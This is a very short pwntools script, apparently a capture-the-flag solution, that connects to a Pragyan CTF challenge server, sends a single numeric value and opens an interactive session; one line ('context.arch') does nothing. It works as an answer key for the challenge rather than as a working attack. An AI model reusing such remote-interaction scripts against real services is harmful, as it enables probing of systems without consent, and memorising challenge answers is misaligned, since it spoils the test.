from pwn import *
context.arch
io = remote('lucid.ctf.pragyan.org', 17030)
io.sendline(b'161038359667425')
io.interactive()